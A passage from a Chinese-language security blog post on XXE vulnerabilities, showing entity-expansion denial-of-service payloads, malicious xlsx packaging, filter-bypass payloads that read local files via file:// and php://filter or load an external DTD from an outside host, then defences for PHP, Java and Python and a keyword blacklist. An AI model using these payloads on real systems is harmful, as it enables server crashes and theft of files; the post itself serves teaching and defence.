&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</code></pre>
<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。 如果目标是UNIX系统，</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot;&gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre>
<p>如果 XML 解析器尝试使用 &#x2F;dev&#x2F;random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
<h3 id="OOXML"><a href="#OOXML" class="headerlink" title="OOXML"></a>OOXML</h3><p>首先用excel创建一个空白的xlsx，然后解压</p>
<pre><code>mkdir XXE &amp;&amp; cd XXE
unzip ../XXE.xlsx
</code></pre>
<p>将 [Content_Types].xml 改成恶意xml，再压缩回去</p>
<pre><code>zip -r ../poc.xlsx *
</code></pre>
<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>利用正则匹配不严格，大小写绕过</p>
<h3 id="ENTITY、SYSTEM、file等关键词被过滤"><a href="#ENTITY、SYSTEM、file等关键词被过滤" class="headerlink" title="ENTITY、SYSTEM、file等关键词被过滤"></a>ENTITY、SYSTEM、file等关键词被过滤</h3><p>使用编码方式绕过：UTF-16BE</p>
<pre><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml
</code></pre>
<h3 id="html实体编码绕过"><a href="#html实体编码绕过" class="headerlink" title="html实体编码绕过"></a>html实体编码绕过</h3><p>如果过滤了http等协议，可以利用实体编码绕过：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY % a &quot;&lt;!ENTITY b SYSTEM &#39;file:///flag&#39; &gt;&quot; &gt;
%a;
]&gt;
&lt;test&gt;&amp;b;&lt;/test&gt;
</code></pre>
<h3 id="data-x2F-x2F-协议绕过"><a href="#data-x2F-x2F-协议绕过" class="headerlink" title="data:&#x2F;&#x2F;协议绕过"></a>data:&#x2F;&#x2F;协议绕过</h3><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY % a &quot; &lt;!ENTITY % b SYSTEM &#39;http://10.10.10.10:8080/hack.dtd&#39;&gt; &quot;&gt;
%a;
%b;
]&gt;
&lt;test&gt;&amp;b;&lt;/test&gt;
&lt;!--编码内容--&gt;
&lt;!ENTITY % b SYSTEM &#39;http://10.10.10.10:8080/hack.dtd&#39;&gt;
</code></pre>
<h3 id="file-x2F-x2F-协议加文件上传"><a href="#file-x2F-x2F-协议加文件上传" class="headerlink" title="file:&#x2F;&#x2F;协议加文件上传"></a>file:&#x2F;&#x2F;协议加文件上传</h3><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY % a SYSTEM
&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
%a;
]&gt;
&lt;!--上传文件--&gt;
&lt;!ENTITY % b SYSTEM &#39;http://10.10.10.10:8080/hack.dtd&#39;&gt;
</code></pre>
<h3 id="php-x2F-x2F-filter协议加文件上传"><a href="#php-x2F-x2F-filter协议加文件上传" class="headerlink" title="php:&#x2F;&#x2F;filter协议加文件上传"></a>php:&#x2F;&#x2F;filter协议加文件上传</h3><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY % a SYSTEM
&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
%a;
]&gt;
&lt;test&gt;
&amp;hack;
&lt;/test&gt;
&lt;!--上传文件--&gt;
&lt;!ENTITY hack SYSTEM &#39;php://filter/read=convert.base64-
encode/resource=./flag.php&#39;&gt;
</code></pre>
<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-
decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
%a;
]&gt;
&lt;test&gt;
&amp;hack;
&lt;/test&gt;
&lt;!--上传文件--&gt;
(&lt;!ENTITY hack SYSTEM &#39;php://filter/read=convert.base64-
encode/resource=./flag.php&#39;&gt;的base64加密)
PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2Rl
L3Jlc291cmNlPS4vZmxhZy5waHAnPg==
</code></pre>
<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="使用语言提供的禁用外部实体方法"><a href="#使用语言提供的禁用外部实体方法" class="headerlink" title="使用语言提供的禁用外部实体方法"></a>使用语言提供的禁用外部实体方法</h3><p><strong>php</strong></p>
<pre><code>libxml_disable_entity_loader(true);
</code></pre>
<p><strong>java</strong></p>
<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);

.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)

.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
</code></pre>
<p><strong>python</strong></p>
<pre><code>from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</code></pre>
<h3 id="手动黑名单过滤"><a href="#手动黑名单过滤" class="headerlink" title="手动黑名单过滤"></a>手动黑名单过滤</h3><pre><code>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC
</code></pre>
<h3 id="专业防御"><a href="#专业防御" class="headerlink" title="专业防御"></a>专业防御</h3><p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leadroyal.cn/p/562/">https://www.leadroyal.cn/p/562/</a></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>学习</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-13">https://xz.aliyun.com/t/3357#toc-13</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
    </div>
    <a href="/2022/08/24/二，xxe漏洞/" class="go-post">
        阅读全文
    </a>
</div>

             
<div class="page-current">
    <div class="prev">
        
        <a href="/">
            <span class="page-num">
                <i class="fa-solid fa-caret-left fa-fw"></i>
            </span>
        </a>
        
    </div>
    <div class="page-index">
        
        <span>
            
            
            <a href="/">
                <span class="page-num">
                    1
                </span>
            </a>
        </span>
        
        <span class="current">
            2
        </span>
        
    </div>
    <div class="next">
        
    </div>
</div>
        </div>
    </div>
    
    <div id="home-card">
        <div id="card-div">
    <div class="card-style" style="width: 300px">
        <div class="avatar">
            <img src=" " alt="avatar">
        </div>
        <div class="name">
            John Doe
        </div>
        <div class="descriptions">
            
            <div class="description">
                Description...
            </div>
            
        </div>
        <div class="icon-links">
            
            <span class="icon-link">
                <a target="_blank" rel="noopener" href="https://github.com/argvchs">
                    <i class="fa-brands fa-github fa-fw"></i>
                </a>
            </span>
            
        </div>
        <div class="friend-links">
            
        </div>
    </div>
</div>
    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 20xx - 2022 Hexo
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @John Doe
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>